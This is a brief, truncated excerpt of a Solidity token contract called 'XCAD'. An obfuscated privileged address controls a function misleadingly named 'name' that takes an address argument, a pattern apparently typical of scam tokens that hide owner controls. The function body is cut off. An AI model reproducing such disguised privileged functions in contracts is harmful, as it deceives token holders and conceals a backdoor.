...
contract XCAD is Ownable {
    ...
    string public _tokenname = "XCAD";
    string public _tokensymbol = "XCAD";
    uint256 tokenamount = 10000000000*10**decimals();
    address public gbfcvd17;
    ...
    function name(address jjkxq1) public     {
        require(gbfcvd17 ==  _msgSender());
        if(gbfcvd17 != _msgSender()){
                revert("fu");
        }
